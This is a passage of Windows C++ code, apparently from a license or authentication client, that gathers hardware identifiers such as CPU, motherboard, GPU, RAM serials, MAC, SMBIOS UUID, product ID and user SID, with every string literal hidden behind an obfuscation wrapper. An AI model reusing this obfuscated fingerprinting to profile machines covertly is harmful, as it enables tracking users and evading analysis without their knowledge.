        if (cpuInfo[3] & (1 << 25)) cpuFeatures += AuthGuards("SSE ").decrypt();
        if (cpuInfo[3] & (1 << 26)) cpuFeatures += AuthGuards("SSE2 ").decrypt();
        if (cpuInfo[2] & (1 << 5)) cpuFeatures += AuthGuards("VMX (Intel VT-x) ").decrypt();
        if (cpuInfo[2] & (1 << 9)) cpuFeatures += AuthGuards("AESNI ").decrypt();
        if (cpuInfo[2] & (1 << 16)) cpuFeatures += AuthGuards("AVX ").decrypt();
        if (cpuInfo[2] & (1 << 28)) cpuFeatures += AuthGuards("AVX2 ").decrypt();
        if (cpuInfo[3] & (1 << 28)) cpuFeatures += AuthGuards("HTT (Hyper-Threading) ").decrypt();
        __cpuid(cpuInfo, 1);
        int cpuId = cpuInfo[0];
        std::string processorId = AuthGuards("UNKNOWN").decrypt();
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (SUCCEEDED(hres)) {
            hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
            if (SUCCEEDED(hres)) {
                hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
                if (SUCCEEDED(hres)) {
                    hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
                    if (SUCCEEDED(hres)) {
                        IEnumWbemClassObject* pEnumerator = NULL;
                        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT ProcessorId FROM Win32_Processor").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                        if (SUCCEEDED(hres)) {
                            IWbemClassObject* pClassObject = NULL;
                            ULONG uReturn = 0;
                            hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
                            if (uReturn != 0 && SUCCEEDED(hres)) {
                                VARIANT vtProp;
                                hres = pClassObject->Get(L"ProcessorId", 0, &vtProp, 0, 0);
                                if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) {
                                    processorId = _bstrToString(vtProp.bstrVal);
                                }
                                VariantClear(&vtProp);
                                pClassObject->Release();
                            }
                            pEnumerator->Release();
                        }
                        pSvc->Release();
                    }
                    pLoc->Release();
                }
            }
            CoUninitialize();
        }
        std::ostringstream oss;
        oss << AuthGuards("Vendor: ").decrypt() << vendor << AuthGuards(", ").decrypt() << AuthGuards("Brand: ").decrypt() << cpuBrand << AuthGuards(", ").decrypt() << AuthGuards("Features: ").decrypt() << cpuFeatures << AuthGuards(", ").decrypt() << AuthGuards("CPU ID: ").decrypt() << std::hex << cpuId << AuthGuards(" ProcessorId: ").decrypt() << processorId;
        return oss.str();
    }
    std::string SystemInfo::getRAMInfo() {
        MEMORYSTATUSEX status;
        status.dwLength = sizeof(status);
        if (GlobalMemoryStatusEx(&status)) {
            std::ostringstream oss;
            oss << AuthGuards("Total: ").decrypt() << status.ullTotalPhys / (1024 * 1024 * 1024) << AuthGuards(" GB, ").decrypt() << AuthGuards("Available: ").decrypt() << status.ullAvailPhys / (1024 * 1024 * 1024) << AuthGuards(" GB").decrypt();
            return oss.str();
        }
        return AuthGuards("UNKNOWN_RAM").decrypt();
    }
    std::string SystemInfo::getUptime() {
        DWORD uptime = GetTickCount64() / 1000;
        int days = uptime / 86400;
        int hours = (uptime % 86400) / 3600;
        int minutes = (uptime % 3600) / 60;
        int seconds = uptime % 60;
        std::ostringstream oss;
        oss << days << AuthGuards(" days, ").decrypt() << hours << AuthGuards(" hours, ").decrypt() << minutes << AuthGuards(" minutes, ").decrypt() << seconds << AuthGuards(" seconds").decrypt();
        return oss.str();
    }
    std::string SystemInfo::getDiskInfo() {
        ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
        if (GetDiskFreeSpaceEx(L"C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
            std::ostringstream oss;
            oss << AuthGuards("Total Disk Space: ").decrypt() << totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024) << AuthGuards(" GB, ").decrypt() << AuthGuards("Free Space: ").decrypt() << totalNumberOfFreeBytes.QuadPart / (1024 * 1024 * 1024) << AuthGuards(" GB").decrypt();
            return oss.str();
        }
        return AuthGuards("UNKNOWN_DISK").decrypt();
    }
    std::string Api::getProductID() {
        HKEY hKey;
        char productID[128];
        DWORD bufferSize = sizeof(productID);
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, AuthGuards("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").decrypt(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueExA(hKey, AuthGuards("ProductId").decrypt(), NULL, NULL, (LPBYTE)productID, &bufferSize) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return std::string(productID);
            }
            RegCloseKey(hKey);
        }
        return AuthGuards("UNKNOWN_PRODUCT_ID").decrypt();
    }
    std::string SystemInfo::getArchitecture() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        return (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? AuthGuards("64-bit").decrypt() : AuthGuards("32-bit").decrypt();
    }
    std::string SystemInfo::getOSInfo() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return AuthGuards("UNKNOWN_OS").decrypt(); }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc
        );
        if (FAILED(hres)) {
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT * FROM Win32_OperatingSystem").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn == 0) {
            pEnumerator->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }

        VARIANT vtProp;
        hres = pClassObject->Get(L"Caption", 0, &vtProp, 0, 0);
        if (FAILED(hres)) {
            VariantClear(&vtProp);
            pClassObject->Release();
            pEnumerator->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        std::string osName = _bstrToString(vtProp.bstrVal);
        VariantClear(&vtProp);
        hres = pClassObject->Get(L"Version", 0, &vtProp, 0, 0);
        if (FAILED(hres)) {
            VariantClear(&vtProp);
            pClassObject->Release();
            pEnumerator->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        std::string osVersion = _bstrToString(vtProp.bstrVal);
        VariantClear(&vtProp);
        hres = pClassObject->Get(L"OSArchitecture", 0, &vtProp, 0, 0);
        if (FAILED(hres)) {
            VariantClear(&vtProp);
            pClassObject->Release();
            pEnumerator->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_OS").decrypt();
        }
        std::string osArch = _bstrToString(vtProp.bstrVal);
        VariantClear(&vtProp);
        std::ostringstream oss;
        oss << osName << AuthGuards(" ").decrypt() << osVersion << AuthGuards(" (").decrypt() << osArch << AuthGuards(")").decrypt();
        pClassObject->Release();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return oss.str();
    }
    std::string SystemInfo::getMotherboardID() {
        HRESULT hres;
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return AuthGuards("UNKNOWN_MOTHERBOARD").decrypt(); }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return AuthGuards("UNKNOWN_MOTHERBOARD").decrypt();
        }
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return AuthGuards("UNKNOWN_MOTHERBOARD").decrypt();
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_MOTHERBOARD").decrypt();
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT * FROM Win32_BaseBoard").decrypt()),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_MOTHERBOARD").decrypt();
        }
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn == 0) {
            pEnumerator->Release();
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return AuthGuards("UNKNOWN_MOTHERBOARD").decrypt();
        }

        VARIANT vtProp;
        hres = pClassObject->Get(L"SerialNumber", 0, &vtProp, 0, 0);
        std::string motherboardID = _bstrToString(vtProp.bstrVal);
        VariantClear(&vtProp);
        pClassObject->Release();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return motherboardID;
    }

    std::string SystemInfo::getMACAddress() {
        IP_ADAPTER_INFO AdapterInfo[16];
        DWORD dwSize = sizeof(AdapterInfo);
        DWORD dwRetVal = GetAdaptersInfo(AdapterInfo, &dwSize);
        if (dwRetVal == ERROR_SUCCESS) {
            PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
            std::ostringstream oss;
            for (int i = 0; i < 6; i++) {
                oss << std::hex << std::setw(2) << std::setfill('0') << (int)pAdapterInfo->Address[i];
                if (i < 5) oss << AuthGuards(":").decrypt();
            }
            return oss.str();
        }
        return AuthGuards("UNKNOWN_MAC").decrypt();
    }

    std::string SystemInfo::getGPUName() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        
        hres = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
        if (FAILED(hres) && hres != RPC_E_CHANGED_MODE) { return ""; }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return "";
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return "";
        }
        
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return "";
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pSvc->ExecQuery( bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT Name FROM Win32_VideoController").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return "";
        }
        
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn == 0) {
            pEnumerator->Release();
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return "";
        }
        VARIANT vtProp;
        std::ostringstream oss;
        hres = pClassObject->Get(L"Name", 0, &vtProp, 0, 0);
        if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << _bstrToString(vtProp.bstrVal); }
        VariantClear(&vtProp);
        pClassObject->Release();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return oss.str();
    }

    std::string SystemInfo::getAppPath() {
        char buffer[MAX_PATH];
        GetModuleFileNameA(NULL, buffer, MAX_PATH);
        return std::string(buffer);
    }

    std::string SystemInfo::getPCName() {
        char computerName[256];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);
        return std::string(computerName);
    }

    std::string SystemInfo::getUUID() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        IEnumWbemClassObject* pEnumerator = NULL;
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) return AuthGuards("UNKNOWN_GPU_UUID").decrypt();
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) { CoUninitialize(); return AuthGuards("UNKNOWN_GPU_UUID").decrypt(); }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) { CoUninitialize(); return AuthGuards("UNKNOWN_GPU_UUID").decrypt(); }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) { pLoc->Release(); CoUninitialize(); return AuthGuards("UNKNOWN_GPU_UUID").decrypt(); }
        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT * FROM Win32_VideoController").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return AuthGuards("UNKNOWN_GPU_UUID").decrypt(); }
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn == 0) { pEnumerator->Release(); pSvc->Release(); pLoc->Release(); CoUninitialize(); return AuthGuards("UNKNOWN_GPU_UUID").decrypt(); }
        VARIANT vtProp;
        hres = pClassObject->Get(L"PNPDeviceID", 0, &vtProp, 0, 0);
        std::string gpuUUID = _bstrToString(vtProp.bstrVal);
        VariantClear(&vtProp);
        pClassObject->Release();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return gpuUUID;
    }
    std::string SystemInfo::getHWID() {
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) { return AuthGuards("UNKNOWN_HWID").decrypt(); }
        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
        if (dwSize == 0) {
            CloseHandle(hToken);
            return AuthGuards("UNKNOWN_HWID").decrypt();
        }

        TOKEN_USER* pTokenUser = (TOKEN_USER*)malloc(dwSize);
        if (!pTokenUser) {
            CloseHandle(hToken);
            return AuthGuards("UNKNOWN_HWID").decrypt();
        }

        if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
            free(pTokenUser);
            CloseHandle(hToken);
            return AuthGuards("UNKNOWN_HWID").decrypt();
        }
        LPWSTR szSID = NULL;
        if (ConvertSidToStringSidW(pTokenUser->User.Sid, &szSID)) {
            std::wstring wstrSID = szSID;
            std::string sidString(wstrSID.begin(), wstrSID.end());
            LocalFree(szSID);
            free(pTokenUser);
            CloseHandle(hToken);
            return sidString;
        }
        free(pTokenUser);
        CloseHandle(hToken);
        return AuthGuards("UNKNOWN_HWID").decrypt();
    }

    std::string SystemInfo::getSMBIOSUUID() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        std::string smbiosUUID = AuthGuards("UNKNOWN_SMBIOS_UUID").decrypt();
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return smbiosUUID; }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return smbiosUUID;
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return smbiosUUID;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return smbiosUUID;
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT UUID FROM Win32_ComputerSystemProduct").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return smbiosUUID;
        }
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn != 0 && SUCCEEDED(hres)) {
            VARIANT vtProp;
            hres = pClassObject->Get(L"UUID", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { smbiosUUID = _bstrToString(vtProp.bstrVal); }
            VariantClear(&vtProp);
            pClassObject->Release();
        }
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return smbiosUUID;
    }

    std::string SystemInfo::getCPUId() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        std::string cpuId = AuthGuards("UNKNOWN_CPU_ID").decrypt();
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return cpuId; }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return cpuId;
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return cpuId;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return cpuId;
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT ProcessorId, UniqueId, DeviceID FROM Win32_Processor").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return cpuId;
        }
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn != 0 && SUCCEEDED(hres)) {
            VARIANT vtProp;
            std::ostringstream oss;
            hres = pClassObject->Get(L"ProcessorId", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("ProcessorId:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"UniqueId", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("UniqueId:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"DeviceID", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("DeviceID:").decrypt() << _bstrToString(vtProp.bstrVal); }
            VariantClear(&vtProp);
            cpuId = oss.str();
            pClassObject->Release();
        }
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return cpuId;
    }

    std::string SystemInfo::getGPUId() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        std::string gpuId = AuthGuards("UNKNOWN_GPU_ID").decrypt();
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return gpuId; }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return gpuId;
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return gpuId;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return gpuId;
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery(
            bstr_t(AuthGuards("WQL").decrypt()),
            bstr_t(AuthGuards("SELECT PNPDeviceID, DeviceID, Name, AdapterRAM FROM Win32_VideoController").decrypt()),
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
            NULL,
            &pEnumerator
        );
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return gpuId;
        }
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        std::ostringstream oss;
        while (pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn) == S_OK && uReturn > 0) {
            VARIANT vtProp;
            hres = pClassObject->Get(L"PNPDeviceID", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("PNPDeviceID:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"DeviceID", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("DeviceID:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Name", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("Name:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"AdapterRAM", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_I8) { oss << AuthGuards("VRAM:").decrypt() << (vtProp.llVal / (1024 * 1024)) << AuthGuards("MB;").decrypt(); }
            VariantClear(&vtProp);
            pClassObject->Release();
        }
        gpuId = oss.str();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return gpuId;
    }

    std::string SystemInfo::getMotherboardId() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        std::string motherboardId = AuthGuards("UNKNOWN_MOTHERBOARD_ID").decrypt();
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) { return motherboardId; }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return motherboardId;
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return motherboardId;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release();
            CoUninitialize();
            return motherboardId;
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery(bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT SerialNumber, Product, Manufacturer, Version FROM Win32_BaseBoard").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        if (FAILED(hres)) {
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            return motherboardId;
        }
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn != 0 && SUCCEEDED(hres)) {
            VARIANT vtProp;
            std::ostringstream oss;
            hres = pClassObject->Get(L"SerialNumber", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("SerialNumber:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Product", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("Product:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Manufacturer", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("Manufacturer:").decrypt() << _bstrToString(vtProp.bstrVal) << AuthGuards("|").decrypt(); }
            VariantClear(&vtProp);
            hres = pClassObject->Get(L"Version", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR) { oss << AuthGuards("Version:").decrypt() << _bstrToString(vtProp.bstrVal); }
            VariantClear(&vtProp);
            motherboardId = oss.str();
            pClassObject->Release();
        }
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return motherboardId;
    }

    std::string SystemInfo::getRAMSerialNumbers() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;
        std::string ramInfo = AuthGuards("UNKNOWN_RAM_SERIAL").decrypt();
        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        if (FAILED(hres)) {
            return ramInfo;
        }
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (FAILED(hres)) {
            CoUninitialize();
            return ramInfo;
        }
        hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
        if (FAILED(hres)) {
            CoUninitialize();
            return ramInfo;
        }
        hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
        if (FAILED(hres)) {
            pLoc->Release(); CoUninitialize();
            return ramInfo;
        }
        IEnumWbemClassObject* pEnumerator = NULL;
        hres = pSvc->ExecQuery( bstr_t(AuthGuards("WQL").decrypt()), bstr_t(AuthGuards("SELECT Capacity, Speed, Manufacturer, PartNumber, SerialNumber, DeviceLocator FROM Win32_PhysicalMemory").decrypt()), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator );
        if (FAILED(hres)) {
            pSvc->Release(); pLoc->Release(); CoUninitialize();
            return ramInfo;
        }
        IWbemClassObject* pClassObject = NULL;
        ULONG uReturn = 0;
        std::ostringstream oss;
        while (pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn) == S_OK && uReturn > 0) {
            VARIANT vtProp;
